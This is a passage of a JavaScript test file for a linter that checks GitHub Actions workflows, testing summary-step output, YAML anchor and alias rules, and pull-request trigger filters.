        void jobs.gate.steps.push({ run: 'echo "gate: green" >> "$GITHUB_STEP_SUMMARY"' }),
    );
    for (const job of LEGS)
      expect(ofJob(got, job)).toContainEqual(
        `${G}: ${job}: has 2 steps writing $GITHUB_STEP_SUMMARY, not exactly its one summary step`,
      );
  });
  it("prints today's two summary lines, byte for byte, for each kind", () => {
    const st = REAL.workflows[G].jobs.gate.steps.find((x) => /GITHUB_STEP_SUMMARY/.test(x.run));
    const dir = mkdtempSync(join(tmpdir(), "leg-summary-"));
    try {
      const line = (ticket) => {
        const out = join(dir, "summary");
        writeFileSync(out, "");
        const r = spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", "-c", st.run], {
          env: {
            PATH: process.env.PATH,
            SDK: "rust",
            TICKET: ticket,
            STATUS: "failure",
            GITHUB_STEP_SUMMARY: out,
          },
        });
        expect(r.status, String(r.stderr)).toBe(0);
        return readFileSync(out, "utf8");
      };
      // GitHub gives a gate leg's missing matrix.sdk.ticket to env: as "".
      expect(line("")).toBe("gate (rust): failure\n");
      expect(line("#806")).toBe("gate (rust), known red #806, not counted: failure\n");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // FR-004, M16: one anchor/alias pair across every workflow, read from the
  // YAML node tree. Anything else could be read one way by this rule's parser
  // and another by GitHub's.
  it.each([
    [
      "a second anchor and its alias",
      G,
      (t) =>
        once(
          "    timeout-minutes: 15\n",
          "    timeout-minutes: *t\n",
        )(
          once(
            "    runs-on: macos-15\n    timeout-minutes: 45\n",
            "    runs-on: macos-15\n    timeout-minutes: &t 45\n",
          )(t),
        ),
      [
        /swift: defines the anchor &t at jobs\.swift\.timeout-minutes; the one anchor/,
        /smoke: uses the alias \*t at jobs\.smoke\.timeout-minutes; the one alias/,
      ],
    ],
    [
      "the allowed anchor aliased a second time",
      G,
      (t) => `${t}x-leg: *dagger-leg\n`,
      [/-: uses the alias \*dagger-leg at x-leg; the one alias/],
    ],
    [
      "the pair under another name",
      G,
      (t) =>
        once("steps: *dagger-leg", "steps: *leg")(once("steps: &dagger-leg", "steps: &leg")(t)),
      [
        /gate: defines the anchor &leg at jobs\.gate\.steps/,
        /gate-known-red: uses the alias \*leg at jobs\.gate-known-red\.steps/,
        /gate: jobs\.gate\.steps is not anchored &dagger-leg/,
        /gate-known-red: jobs\.gate-known-red\.steps is not the alias \*dagger-leg/,
      ],
    ],
    [
      "an anchor and alias in another workflow",
      "verify.yml",
      (t) => `${t}x-a: &a 1\nx-b: *a\n`,
      [
        /^verify\.yml: -: defines the anchor &a at x-a/,
        /^verify\.yml: -: uses the alias \*a at x-b/,
      ],
    ],
    [
      "a << merge key",
      G,
      once("    timeout-minutes: 15\n", "    <<: { timeout-minutes: 15 }\n"),
      [/smoke: has a << merge key at jobs\.smoke/],
    ],
    [
      "an anchor name defined twice",
      G,
      once("    runs-on: macos-15\n", "    runs-on: &dagger-leg macos-15\n"),
      [/-: defines the anchor &dagger-leg 2 times/],
    ],
  ])("refuses %s", (_name, file, edit, res) => {
    const got = afterText(edit, file);
    for (const re of res)
      expect(
        got.some((g) => re.test(g)),
        `${re}\n${got.join("\n")}`,
      ).toBe(true);
  });
  it("is fed the workflows' text, and refuses to run blind without it", () => {
    expect(
      allFindings({ ...REAL, sources: undefined, scriptOutputs: SCRIPTS }).map((f) => f.why),
    ).toContainEqual(expect.stringMatching(/no workflow source was given/));
  });

  it("the trigger check is one helper over GATE_WORKFLOWS, and refuses any other file", () => {
    expect(GATE_WORKFLOWS).toEqual(["verify.yml", G]);
    for (const f of GATE_WORKFLOWS) {
      const doc = structuredClone(REAL.workflows[f]);
      expect(gateTriggerProblems(f, doc)).toEqual([]);
      doc.on.pull_request = { types: ["labeled"] };
      expect(gateTriggerProblems(f, doc)).toEqual([
        "filters pull_request by types, so a change can skip the gate",
      ]);
    }
    expect(() => gateTriggerProblems("contract-live.yml", {})).toThrow(/GATE_WORKFLOWS/);
  });
});
